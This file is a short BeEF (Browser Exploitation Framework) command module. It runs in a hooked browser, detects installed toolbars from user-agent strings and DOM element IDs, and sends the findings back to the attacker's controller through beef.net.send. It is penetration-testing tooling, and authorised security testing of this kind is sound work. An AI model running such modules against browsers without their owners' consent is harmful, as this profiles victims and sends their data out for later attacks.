//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	
	var toolbar_ua = new Array (
		new Array (" Alexa Toolbar", " Alexa"),
		new Array (" AskTbS-PV", " Ask"),
		new Array (" BRI", " Bing"),
		new Array (" GTB", " Google"),
		new Array (" SU ", " Stumble Upon")
		)
		
	var toolbar_id = new Array (
		new Array ("AlexaCustomScriptId", " Alexa")
		)	

	var result = '';
	var separator = ", ";
    
	// CHECK USER-AGENT
	for (var i = 0; i < toolbar_ua.length; i++) {
		
		var agentRegex = new RegExp( toolbar_ua[i][0], 'g' );
		
		if ( agentRegex.exec(navigator.userAgent) ) {
			
			result += toolbar_ua[i][1] + separator;			
			
		}
	}
	
	// CHECK ELEMENT ID (DOM)
	for (var i = 0; i < toolbar_id.length; i++) {
		
		var element =  document.getElementById( toolbar_id[i][0] );
		
		if ( typeof(element) != 'undefined' && element != null ) {
			
			result += toolbar_id[i][1] + separator;
			
		}
	}

	// ENDING
	if ( result != '' ) {
		
		result = result.slice(0, -separator.length);
		
	} else if ( result == '' ) {
		
		result = " no toolbars detected";
		
	}
	
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "toolbars="+result);	
	
});